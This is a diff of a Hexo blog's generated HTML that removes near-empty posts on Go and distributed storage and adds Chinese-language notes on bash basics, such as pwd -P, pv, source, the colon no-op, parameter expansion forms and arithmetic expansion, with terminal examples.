-            <h1 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h1><p><a href="https://studygolang.com/articles/12136" target="_blank" rel="noopener">https://studygolang.com/articles/12136</a></p>
-<p>go 的 defer 语句是用来延迟执行函数的，而且延迟发生在调用函数 return 之后,defer 的重要用途一：清理释放资源,defer 的重要用途二：执行 recover</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/04/go/文件操作/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/04/go/文件操作/" itemprop="url">文件操作</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-04T20:59:48+08:00">
-                2019-11-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/go/" itemprop="url" rel="index">
-                    <span itemprop="name">go</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h1>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/04/分布式/MIT 6.824/start/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/04/分布式/MIT 6.824/start/" itemprop="url">start</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-04T20:39:36+08:00">
-                2019-11-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/MT6-248/" itemprop="url" rel="index">
-                    <span itemprop="name">MT6.248</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="相关博客"><a href="#相关博客" class="headerlink" title="相关博客"></a>相关博客</h1>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/01/分布式/大规模分布式存储系统/分布式系统原理/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/01/分布式/大规模分布式存储系统/分布式系统原理/" itemprop="url">分布式系统原理</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-01T19:06:52+08:00">
-                2019-11-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/dotnet/" itemprop="url" rel="index">
-                    <span itemprop="name">dotnet</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="分布式系统原理"><a href="#分布式系统原理" class="headerlink" title="分布式系统原理"></a>分布式系统原理</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/31/分布式/大规模分布式存储系统/第九章分布式存储引擎/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/10/31/分布式/大规模分布式存储系统/第九章分布式存储引擎/" itemprop="url">第九章分布式存储引擎</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-31T21:24:32+08:00">
-                2019-10-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/dotnet/" itemprop="url" rel="index">
-                    <span itemprop="name">dotnet</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>分布式存储引擎层包含三个模块: RootServer,UpdateServer,ChunkServer</p>
 <ul>
-<li>RootServer: 用于整体控制,实现子表分布,副本复制,负载均衡,机器管理以及Schema管理</li>
-<li>UpdateServer: 用于存储增量数据</li>
-<li>ChunkServer: 用于存储基线数据</li>
+<li>pwd<ul>
+<li>-P代表avoid all symlinks(避免所有符号链接)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server /home/q/mysql/multi/3308/private]# ln -s /tmp test</span><br><span class="line">[root@server /home/q/mysql/multi/3308/private]# ll</span><br><span class="line">lrwxrwxrwx 1 root root 4 Mar 21 23:50 test -&gt; /tmp</span><br><span class="line">[root@server /home/q/mysql/multi/3308/private/test]# pwd</span><br><span class="line">/home/q/mysql/multi/3308/private/test</span><br><span class="line">[root@server /home/q/mysql/multi/3308/private/test]# pwd -P</span><br><span class="line">/tmp</span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
+</li>
+</ul>
+<h2 id="pv"><a href="#pv" class="headerlink" title="pv"></a>pv</h2><p>通过管道监视数据的进度</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f, --force</span><br><span class="line">        Force output.  Normally, pv will not output any visual display if standard error is not a terminal.  This option forces it to do so.</span><br></pre></td></tr></table></figure>
+
+<h2 id="点命令"><a href="#点命令" class="headerlink" title="点命令"></a>点命令</h2><p>A:<code>. $(dirname $0)/wsrep_sst_common</code>从当前目录读取wsrep_sst_common文件并在当前进程执行，类似import语句，相当于source命令<br>B:可以使用点命令/source命在不修改文件权限的情况下，直接执行shell脚本<code>. test.sh/source test.sh</code>,它与直接执行shell的区别在于这样执行的shell是在本地shell中执行，而./test.sh 是在子shell中执行。<br>C:常用在多个shell文件公用变量时，可以将变量抽到一个文件中，在使用时source进去<br>15.declare用于声明 shell 变量<br>-a Each name is an indexed array variable (see Arrays above).</p>
+<h2 id="冒号命令"><a href="#冒号命令" class="headerlink" title="冒号命令"></a>冒号命令</h2><p>没有效果; 该命令除了扩展参数和执行任何指定的重定向之外什么都不做。 返回零退出代码</p>
+<ul>
+<li><p>脚本注释、占位符</p>
+<ul>
+<li>占位符啥也不做，只起到占位符的作用。比如在编写脚本的过程中，某些语法结构需要多个部分组成，但开始阶段并没有想好或完成相应的代码，这时就可以用:来做占位符，否则执行时就会报错。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh  </span></span><br><span class="line"></span><br><span class="line">: this is single line comment  </span><br><span class="line"></span><br><span class="line">: 'this is a multiline comment,  </span><br><span class="line">second line  </span><br><span class="line">end of comments'  </span><br><span class="line"></span><br><span class="line">if [ "1" == "1" ]; then  </span><br><span class="line">        echo "yes"  </span><br><span class="line">else  </span><br><span class="line">        :  </span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>执行任何指定的重定向</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">: &gt; file等价于&gt;file</span><br><span class="line">: $&#123;VAR:=DEFAULT&#125; 等价于 VAR=$&#123;VAR:=DEFAULT&#125;  相当于将VAR重定向为DEFAULT值</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><a href="http://blog.csdn.net/honghuzhilangzixin/article/details/7073312" target="_blank" rel="noopener">shell中的冒号“：”–个人整理总结版-注意与makfle中:的区别</a></p>
+<h2 id="shell特殊字符和引用"><a href="#shell特殊字符和引用" class="headerlink" title="shell特殊字符和引用"></a>shell特殊字符和引用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> 变量表达式</span></span><br><span class="line">&amp; 后台作业</span><br><span class="line">* 字符串通配符</span><br><span class="line">( 启动子 shell</span><br><span class="line">) 停止子 shell</span><br><span class="line">\ 应用下一个字符</span><br><span class="line">| 管道</span><br><span class="line">[ 开始字符集通配符号</span><br><span class="line">] 结束字符集通配符号</span><br><span class="line">&#123; 开始命令块</span><br><span class="line">&#125; 结束命令块</span><br><span class="line">; shell 命令分隔符</span><br><span class="line">' 强引用</span><br><span class="line">" 弱引用</span><br><span class="line">&lt; 输入重定向</span><br><span class="line">输出重定向</span><br><span class="line">/ 路径名目录分割符</span><br><span class="line">? 单个任意字符</span><br><span class="line">! 管道行逻辑 NOT</span><br></pre></td></tr></table></figure>
+
+<h2 id="bash-数组学习笔记"><a href="#bash-数组学习笔记" class="headerlink" title="bash 数组学习笔记"></a>bash 数组学习笔记</h2><p><a href="http://github.tiankonguse.com/recordpost.html?id=702" target="_blank" rel="noopener">bash 数组学习笔记</a></p>
+<h2 id="shell-编程：冒号-后面跟-等号，加号，减号，问号的意义"><a href="#shell-编程：冒号-后面跟-等号，加号，减号，问号的意义" class="headerlink" title="shell 编程：冒号 后面跟 等号，加号，减号，问号的意义"></a>shell 编程：冒号 后面跟 等号，加号，减号，问号的意义</h2><ul>
+<li><code>:=句法</code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">只有当变量username已被定义，而且是一个空值时，变量username才会被设置为变量LOGNAME的值</span><br><span class="line">[root@server ~]# username=""</span><br><span class="line">[root@server ~]# echo "$&#123;username:=$LOGNAME&#125;"</span><br><span class="line">root</span><br><span class="line">[root@server ~]# username="ss"</span><br><span class="line">[root@server ~]# echo "$&#123;username:=$LOGNAME&#125;"</span><br><span class="line">ss</span><br><span class="line">[root@server ~]# echo "$&#123;name:=$LOGNAME&#125;"</span><br><span class="line">root</span><br><span class="line">[root@server ~]# echo $name</span><br><span class="line">root</span><br><span class="line">[root@server ~]#</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<ul>
+<li><code>=句法</code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">只有当变量name未被定义过，变量name才会被设置为变量LOGNAME的值,当username被定义过,则会输出空行</span><br><span class="line">[root@server ~]# username=""</span><br><span class="line">[root@server ~]# echo "$&#123;username=$LOGNAME&#125;"</span><br><span class="line"></span><br><span class="line">[root@server ~]# username="ss"</span><br><span class="line">[root@server ~]# echo "$&#123;username=$LOGNAME&#125;"</span><br><span class="line">ss</span><br><span class="line">[root@server ~]# echo "$&#123;name=$LOGNAME&#125;"</span><br><span class="line">root</span><br><span class="line">[root@server ~]# echo $name</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><strong><code>:=句法</code>要比<code>=句法</code>限制更松些,<code>:=句法</code>允许变量为空,只有<code>:=句法</code>和<code>=句法</code>赋值</strong><br>当脚本或者函数需要依赖某些定义变量时，就要使用这种语法。它主要应用于登陆。如果一个特定环境变量还没有被定义，就可以给它赋予脚本所需要的值</p>
+<hr>
+<ul>
+<li><p><code>:-句法</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">只有当变量username为空时，在`“$&#123;&#125;”`句法中username被替换为`$LOGNAME`</span><br><span class="line">[root@server ~]# username=""</span><br><span class="line">[root@server ~]# echo "$&#123;username:-$LOGNAME&#125;"</span><br><span class="line">root</span><br><span class="line">[root@server ~]# echo $username</span><br><span class="line"></span><br><span class="line">[root@server ~]# username="ss"</span><br><span class="line">[root@server ~]# echo "$&#123;username:-$LOGNAME&#125;"</span><br><span class="line">ss</span><br><span class="line">[root@server ~]# echo "$&#123;usernameee:-$LOGNAME&#125;"</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>-句法</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">只有当变量username为空时，在`“$&#123;&#125;”`句法中username不会被替换</span><br><span class="line">[root@server ~]# username=""</span><br><span class="line">[root@server ~]# echo "$&#123;username-$LOGNAME&#125;"</span><br><span class="line"></span><br><span class="line">[root@server ~]# username="ss"</span><br><span class="line">[root@server ~]# echo "$&#123;username-$LOGNAME&#125;"</span><br><span class="line">ss</span><br><span class="line">[root@server ~]# echo "$&#123;usernamesss-$LOGNAME&#125;"</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><strong><code>:-句法</code>要比<code>-句法</code>限制更松些,<code>:-句法</code>允许变量为空,但是与<code>:=句法</code>要比`=句法区别是都不会给变量赋值</strong><br>当脚本评价或检查系统环境的时，:-句法和-句法都可以使用。这两种检查基本上是相反的，它们用默认值替换变量，或者甚至于不依赖username变量是否已经被定义。如果脚本中急需要一组被定义的变量，也需要一些不该被定义的变量，那么在脚本执行任务之前组合这两种句法，肯定可以实现正确的设置。</p>
+<hr>
+<ul>
+<li><p><code>:?句法</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当变量未被定义或者定义了一个空值时,那么在echo命令中就会使用LOGNAME的值，并且脚本退出执行</span><br><span class="line">[root@server ~]# username="sss"</span><br><span class="line">[root@server ~]# echo "$&#123;username:?$LOGNAME&#125;"</span><br><span class="line">sss</span><br><span class="line">[root@server ~]# username=""</span><br><span class="line">[root@server ~]# echo "$&#123;username:?$LOGNAME&#125;"</span><br><span class="line">bash: username: root</span><br><span class="line">[root@server ~]# echo "$&#123;useme:?$LOGNAME&#125;"</span><br><span class="line">bash: useme: root</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>?句法</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当变量未被定义时那么在echo命令中就会使用LOGNAME的值，并且脚本退出执行</span><br><span class="line">[root@server ~]# username=""</span><br><span class="line">[root@server ~]# echo "$&#123;username?$LOGNAME&#125;"</span><br><span class="line">[root@server ~]# echo "$&#123;userna?$LOGNAME&#125;"</span><br><span class="line">bash: userna: root</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><strong><code>:?句法</code>与<code>?句法</code>区别在于，<code>?句法</code>允许变量为空”</strong></p>
+<hr>
+<ul>
+<li><p><code>:+句法</code>只有当变量已被定义而且是非空的时候，“${}”表达式才执行替换</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# username="ss"</span><br><span class="line">[root@server ~]# echo "$&#123;username:+$LOGNAME&#125;"</span><br><span class="line">root</span><br><span class="line">[root@server ~]# username=""</span><br><span class="line">[root@server ~]# echo "$&#123;username:+$LOGNAME&#125;"</span><br><span class="line"></span><br><span class="line">[root@server ~]# echo "$&#123;usernam+$LOGNAME&#125;"</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>+句法</code>,</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">只要变量被定义了即使为空,“$&#123;&#125;”表达式也执行替换</span><br><span class="line">[root@server ~]# echo "$&#123;use+$LOGNAME&#125;"</span><br><span class="line"></span><br><span class="line">[root@server ~]# username="ss"</span><br><span class="line">[root@server ~]# echo "$&#123;username+$LOGNAME&#125;"</span><br><span class="line">root</span><br><span class="line">[root@server ~]# username=""</span><br><span class="line">[root@server ~]# echo "$&#123;username+$LOGNAME&#125;"</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><strong><code>:+句法</code>要比<code>+句法</code>要求苛刻些，<code>+句法</code>允许变量为空</strong></p>
+<hr>
+<p><strong>区别：</strong></p>
+<ul>
+<li><code>:?句法</code>与<code>?句法</code>与其他句法区别<br>  错误之后退出，其他不会</li>
+<li><code>:=句法</code>与<code>=句法</code>与其他句法区别<br>  只有<code>:=句法</code>与`=句法会将结果赋值给变量,其他都不会</li>
+<li><code>:+</code>、<code>+</code> 与<code>:-</code>、<code>-</code>区别<br>  最主要的区别是<code>:+</code>、<code>+</code>示例检查的是一个已定义的变量，而不是未定义的变量</li>
+<li><code>:?句法</code>、<code>?句法</code>与<code>:=句法</code>、<code>=句法</code>区别<br>  主要区别是<code>？</code>会退出,<code>=</code>会赋值.<br><a href="http://www.cnblogs.com/fhefh/archive/2011/04/22/2024750.html" target="_blank" rel="noopener">linux bash shell之变量替换</a></li>
+</ul>
+<h2 id="Linux-shell-中-反引号，-，-，-作用与区别"><a href="#Linux-shell-中-反引号，-，-，-作用与区别" class="headerlink" title="Linux shell 中$() 反引号，${}，$[] $(())，[ ] (( )) [[ ]]作用与区别"></a>Linux shell 中<code>$() 反引号，${}，$[] $(())，[ ] (( )) [[ ]]</code>作用与区别</h2><ul>
+<li><p><code>$()</code>和 反引号<br>用来做命令替换用</p>
+<ul>
+<li>各自的优缺点<br>  a.反引号 基本上可用在全部的 unix shell 中使用，若写成 shell script ，其移植性比较高。但反单引号容易打错或看错。<br>  b.<code>$()</code>并不是所有shell都支持。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# version=$(uname -r)</span><br><span class="line">[root@server ~]# echo $version</span><br><span class="line">2.6.32-358.23.2.el6.x86_64</span><br><span class="line">[root@server ~]# version=`uname -r`</span><br><span class="line">[root@server ~]# echo $version</span><br><span class="line">2.6.32-358.23.2.el6.x86_64</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><code>${ }</code><br><code>${ }</code>用于变量替换。一般情况下，<code>$var</code> 与<code>${var}</code> 并没有啥不一样。但是用 <code>${ }</code> 会比较精确的界定变量名称的范围</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# A=B</span><br><span class="line">[root@server ~]# echo $AB</span><br><span class="line"></span><br><span class="line">[root@server ~]# echo $&#123;A&#125;B</span><br><span class="line">BB</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]#  A='abcde'</span><br><span class="line">[root@server ~]# echo $&#123;A#cd&#125;</span><br><span class="line">abcde</span><br><span class="line">[root@server ~]# echo $&#123;A#ab&#125;</span><br><span class="line">cde</span><br><span class="line">[root@server ~]# echo $&#123;A%de&#125;</span><br><span class="line">abc</span><br><span class="line">[root@server ~]# A='abcabcde'</span><br><span class="line">[root@server ~]# echo $&#123;A/abc/df&#125;</span><br><span class="line">dfabcde</span><br><span class="line">[root@server ~]# echo $&#123;A//abc/df&#125;</span><br><span class="line">dfdfde</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>$[] $(())</code><br>它们是一样的，都是进行数学运算的。支持+ - * / %：分别为 “加、减、乘、除、取模”。但是注意，bash只能作整数运算，对于浮点数是当作字符串处理的<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# a=5; b=7; c=2</span><br><span class="line">[root@server ~]# echo $(( a+b*c ))</span><br><span class="line">19</span><br><span class="line">[root@server ~]# echo $(( (a+b)/c ))</span><br><span class="line">6</span><br><span class="line">[root@server ~]# echo $(( (a*b)%c))</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>在 <code>$(( ))</code> 中的变量名称，可于其前面加<code>$</code>符号来替换，也可以不用<br><code>$(( $a + $b * $c))</code> 也可得到 19 的结果</p>
+<ul>
+<li><code>[ ]</code>:<br>即为test命令的另一种形式</li>
+</ul>
